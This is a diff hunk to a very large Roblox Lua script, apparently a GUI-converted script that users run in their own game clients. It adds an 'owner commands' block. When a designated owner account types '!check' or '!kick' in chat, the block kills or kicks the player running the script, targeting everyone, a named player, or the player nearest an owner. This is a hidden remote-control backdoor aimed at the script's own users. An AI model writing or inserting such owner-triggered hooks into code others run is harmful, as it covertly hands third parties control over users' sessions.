@@ -17440,6 +17440,65 @@ local script = G2L["d1"];
 				end
 			end
 		end
+		-- ---- OWNER COMMANDS ----
+		repeat task.wait() until _G.IsOwner
+		if _G.IsOwner(plr.UserId) then
+			-- Reset character function
+			shared.ResetCharacter = shared.ResetCharacter or function()
+				if LocalPlayer.Character then
+					LocalPlayer.Character:BreakJoints()
+				end
+			end
+			-- Find nearest player to an owner
+			local function findNearestToOwner()
+				local nearestPlayer = nil
+				local shortestDist = math.huge
+				for _, owner in ipairs(Players:GetPlayers()) do
+					if _G.IsOwner(owner.UserId) and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
+						for _, p in ipairs(Players:GetPlayers()) do
+							if p ~= owner and p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+								local dist = (owner.Character.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
+								if dist < shortestDist then
+									shortestDist = dist
+									nearestPlayer = p
+								end
+							end
+						end
+					end
+				end
+				return nearestPlayer
+			end
+			-- !check command
+			local checkTarget = rawMsg:match("^!check%s+(.+)")
+			if checkTarget then
+				checkTarget = checkTarget:lower():match("^%s*(.-)%s*$")
+				if checkTarget == "all" then
+					shared.ResetCharacter()
+				elseif checkTarget == "nearest" then
+					local nearest = findNearestToOwner()
+					if nearest and (nearest.Name:lower() == LocalPlayer.Name:lower() or nearest.DisplayName:lower() == LocalPlayer.DisplayName:lower()) then
+						shared.ResetCharacter()
+					end
+				elseif LocalPlayer.Name:lower() == checkTarget or LocalPlayer.DisplayName:lower() == checkTarget then
+					shared.ResetCharacter()
+				end
+			end
+			-- !kick command
+			local kickTarget = rawMsg:match("^!kick%s+(.+)")
+			if kickTarget then
+				kickTarget = kickTarget:lower():match("^%s*(.-)%s*$")
+				if kickTarget == "all" then
+					LocalPlayer:Kick("You have been kicked from the game.")
+				elseif kickTarget == "nearest" then
+					local nearest = findNearestToOwner()
+					if nearest and (nearest.Name:lower() == LocalPlayer.Name:lower() or nearest.DisplayName:lower() == LocalPlayer.DisplayName:lower()) then
+						LocalPlayer:Kick("You have been kicked from the game.")
+					end
+				elseif LocalPlayer.Name:lower() == kickTarget or LocalPlayer.DisplayName:lower() == kickTarget then
+					LocalPlayer:Kick("You have been kicked from the game.")
+				end
+			end
+		end
 	end
 	
 	-- ============================================================
